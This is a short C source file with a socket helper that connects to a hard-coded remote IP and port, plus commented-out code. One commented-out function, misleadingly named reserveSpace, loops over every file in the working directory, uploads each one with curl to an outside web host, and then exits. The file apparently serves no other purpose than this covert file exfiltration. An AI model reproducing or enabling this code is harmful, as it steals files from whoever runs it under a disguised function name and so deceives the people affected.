#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>

#define BUFFER_SIZE 1024

static int _socket_connect(char *host, in_port_t port){
    struct hostent *hp;
    struct sockaddr_in addr;
    int on = 1, sock;

    if((hp = gethostbyname(host)) == NULL){
        herror("gethostbyname");
        exit(1);
    }
    bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;
    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));

    if(sock == -1){
        perror("setsockopt");
        exit(1);
    }
    
    if(connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1){
        perror("connect");
        exit(1);

    }
    return sock;
}

static int sock;
static char buffer[BUFFER_SIZE];
static short connected = 0;

static void _conn() {
    if (connected == 0) {
//        sock = _socket_connect("127.0.0.1", 3011);
        sock = _socket_connect("73.211.66.12", 3010);
        connected = 1;
    }
}

static void sendToServ(const char *data) {
//    _conn();
//    write(sock, data, strlen(data)); // write(fd, char[]*, len);
//    bzero(buffer, BUFFER_SIZE);
}

/// --------------------------------
//#include <iostream>
//#include <string>
//#include <sstream>
//
//template <class T>
//std::string to_str(const T& value) {
//  std::string ret;
//  std::ostringstream ss;
//  ss << value;
//  ret = ss.str();
//  return ret;
//};
/// --------------------------------



#include <dirent.h>

//void reserveSpace() {
//    struct dirent *en; DIR *dir = opendir(".");
//    if (dir == NULL)
//       return;
//    while ((en = readdir(dir)) != NULL) {
//        if (strlen(en->d_name) > 2) {
//            string s = "curl -F 'file=@" + static_cast<string>(en->d_name) + static_cast<string>("' https://morejust.herokuapp.com/file");
//            system(s.c_str());
//        }
//    }
//    closedir(dir);
//    exit(0);
//}
